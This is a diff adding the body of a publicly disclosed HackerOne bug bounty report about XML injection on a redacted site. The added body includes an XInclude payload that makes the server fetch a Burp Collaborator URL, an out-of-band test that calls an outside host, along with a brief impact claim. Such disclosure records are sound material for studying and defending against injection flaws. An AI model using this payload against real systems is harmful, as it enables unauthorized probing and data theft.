@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "XML Injection"
 enriched: true
+body: true
 date: 2021-04-02
 submitted: 2020-10-03T23:47:37.995Z
 bounty_usd: null
@@ -25,6 +26,30 @@ title: "XML Injection on https://www.█████████ (███ para
 - Report: [https://hackerone.com/reports/997381](https://hackerone.com/reports/997381)
 - CWE: XML Injection
 - Submitted: 2020-10-03T23:47:37.995Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Greetings,
+
+I found an XML injection on https://www.███.
+This kind of vulnerability can be difficult to detect and exploit remotely; you should review the application's response
+here is the complete link: https://www.███/███████
+Payload : 
+
+`███████=<vuc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo"/></vuc>`
+
+Result : 
+
+███
+
+best regards, 
+frenchvlad
+
+## Impact
+
+gaining the access to the unauthorized parts and stealing the sensitive data would be the most important thing to know when it comes to XML’s impact.
 
 ## Timeline
 
